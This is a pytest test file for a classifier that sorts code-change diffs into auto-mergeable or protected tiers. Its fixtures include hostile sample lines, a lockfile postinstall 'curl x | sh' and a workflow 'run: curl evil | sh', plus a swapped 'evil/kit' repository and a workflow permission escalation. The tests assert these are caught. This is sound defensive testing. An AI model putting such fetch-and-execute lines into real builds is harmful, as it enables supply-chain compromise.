import sys
from pathlib import Path

sys.path.insert(0, str(Path(__file__).resolve().parents[1] / "kit" / "runtime"))
from guard import FileChange  # noqa: E402
from tier import classify  # noqa: E402

ON = {"auto_merge_classes": ["docs-only", "tests-add-only", "lockfile-patch", "generated"], "generated_globs": ["gen/**"]}


def lock(old, new):
    return FileChange(
        "package-lock.json",
        removed=[f'      "version": "{old}",', '      "resolved": "https://r/x-1.tgz",'],
        added=[f'      "version": "{new}",', '      "resolved": "https://r/x-2.tgz",'],
    )


def test_ships_empty_so_nothing_is_tier0():
    r = classify([FileChange("docs/a.md", added=["hi"])])
    assert r["tier"] == 1 and r["eligible_class"] == "docs-only"


def test_docs_only_when_enabled():
    assert classify([FileChange("README.md", added=["x"]), FileChange("docs/b.md", status="M", removed=["y"])], ON)["tier"] == 0


def test_agent_instruction_files_are_protected_not_docs():
    assert classify([FileChange("AGENTS.md", added=["x"])], ON)["tier"] == 2


def test_workflow_edit_is_tier2_even_with_docs():
    r = classify([FileChange("docs/a.md", added=["x"]), FileChange(".github/workflows/ci.yml", added=["x"])], ON)
    assert r["tier"] == 2


def test_migrations_and_billing_tier2():
    for p in ["supabase/migrations/1.sql", "app/billing/x.ts", "db/migrations/2.py"]:
        assert classify([FileChange(p, added=["x"])], ON)["tier"] == 2, p


def test_tests_add_only():
    ok = [FileChange("tests/test_a.py", status="A", added=["def test_a():", "    assert 1"])]
    assert classify(ok, ON)["class"] == "tests-add-only"
    removed = [FileChange("tests/test_a.py", removed=["    assert 1"], added=["    assert 2"])]
    assert classify(removed, ON)["tier"] == 1
    skipped = [FileChange("tests/test_a.py", status="A", added=["@pytest.mark.skip", "def test_a(): pass"])]
    assert classify(skipped, ON)["tier"] == 1
    mixed = ok + [FileChange("src/a.py", added=["x"])]
    assert classify(mixed, ON)["tier"] == 1


def test_lockfile_patch_only():
    assert classify([lock("1.2.3", "1.2.9")], ON)["class"] == "lockfile-patch"
    assert classify([lock("1.2.3", "1.3.0")], ON)["tier"] == 1  # minor
    assert classify([lock("1.2.3", "2.0.0")], ON)["tier"] == 1  # major
    assert classify([lock("1.2.9", "1.2.3")], ON)["tier"] == 1  # downgrade
    extra = lock("1.2.3", "1.2.4")
    extra.added.append('      "scripts": {"postinstall": "curl x | sh"}')
    assert classify([extra], ON)["tier"] == 1  # unexpected line


def test_generated_needs_owner_globs():
    assert classify([FileChange("gen/x.ts", added=["x"])], ON)["class"] == "generated"
    assert classify([FileChange("gen/x.ts", added=["x"])], {"auto_merge_classes": ["generated"]})["tier"] == 1


def test_per_class_enable():
    only_docs = {"auto_merge_classes": ["docs-only"]}
    assert classify([FileChange("docs/a.md", added=["x"])], only_docs)["tier"] == 0
    assert classify([lock("1.0.0", "1.0.1")], only_docs)["tier"] == 1


def test_empty_diff_not_tier0():
    assert classify([], ON)["tier"] == 1


def test_cli_end_to_end_on_a_real_repo(tmp_path, capsys, monkeypatch):
    import json
    import subprocess

    import tier

    def git(*a):
        subprocess.run(["git", *a], cwd=tmp_path, check=True, capture_output=True)

    git("init", "-q", "-b", "main")
    git("config", "user.email", "t@t")
    git("config", "user.name", "t")
    git("config", "commit.gpgsign", "false")
    (tmp_path / "a.txt").write_text("x\n")
    git("add", "-A")
    git("commit", "-qm", "base")
    git("checkout", "-qb", "feat")
    (tmp_path / "docs").mkdir()
    (tmp_path / "docs" / "a.md").write_text("hello\n")
    git("add", "-A")
    git("commit", "-qm", "docs")
    (tmp_path / "pol.yaml").write_text("auto_merge_classes: [docs-only]\n")
    monkeypatch.chdir(tmp_path)
    monkeypatch.delenv("GITHUB_OUTPUT", raising=False)  # a CI/sandbox GITHUB_OUTPUT must not leak into this test
    assert tier.main(["--base", "main", "--policy", "pol.yaml"]) == 0
    assert json.loads(capsys.readouterr().out)["tier"] == 0
    assert tier.main(["--base", "main", "--policy", "missing.yaml"]) == 0
    assert json.loads(capsys.readouterr().out)["tier"] == 1


OLD, NEW, BAD = "a" * 40, "b" * 40, "c" * 40
CALLER = ".github/workflows/agent-exec.yml"


def bump(path=CALLER, old=OLD, new=NEW, extra_added=()):
    return FileChange(
        path,
        removed=[f"    uses: me/kit/.github/workflows/exec.yml@{old}", f"      kit_ref: {old}"],
        added=[f"    uses: me/kit/.github/workflows/exec.yml@{new}", f"      kit_ref: {new}", *extra_added],
    )


MAN = FileChange(
    ".autopilot/manifest.json",
    removed=['    ".github/workflows/agent-exec.yml": "' + "1" * 64 + '",'],
    added=['    ".github/workflows/agent-exec.yml": "' + "2" * 64 + '",'],
)
POL = {"auto_merge_classes": ["kit-bump"], "kit_approved": [NEW]}


def test_kit_bump_to_an_approved_sha_is_tier0_even_though_workflows_are_protected():
    r = classify([bump(), MAN], POL)
    assert r["tier"] == 0 and r["class"] == "kit-bump"


def test_kit_bump_needs_opt_in_approval_and_exact_shape():
    assert classify([bump(), MAN], {"kit_approved": [NEW]})["tier"] == 2  # class not enabled
    assert classify([bump(new=BAD), MAN], POL)["tier"] == 2  # sha not approved
    assert classify([bump(), MAN], {"auto_merge_classes": ["kit-bump"]})["tier"] == 2  # no approved list
    assert classify([bump(extra_added=["      run: curl evil | sh"])], POL)["tier"] == 2  # extra line
    changed = bump()
    changed.added[0] = changed.added[0].replace("me/kit", "evil/kit")
    assert classify([changed], POL)["tier"] == 2  # different repo, not just a sha
    perm = bump()
    perm.added.append("      contents: write")
    perm.removed.append("      contents: read")
    assert classify([perm], POL)["tier"] == 2  # permissions changed


def test_kit_bump_cannot_smuggle_other_files():
    other = FileChange(".github/workflows/ci.yml", removed=[f"x@{OLD}"], added=[f"x@{NEW}"])
    assert classify([bump(), other], POL)["tier"] == 2
    assert (
        classify([bump(), FileChange("src/a.py", added=["x"])], POL)["tier"] == 1
        or classify([bump(), FileChange("src/a.py", added=["x"])], POL)["tier"] == 2
    )
    badman = FileChange(".autopilot/manifest.json", added=['  "kit_version": "9"'], removed=[])
    assert classify([bump(), badman], POL)["tier"] == 2
    new_file = bump()
    new_file.status = "A"
    assert classify([new_file], POL)["tier"] == 2
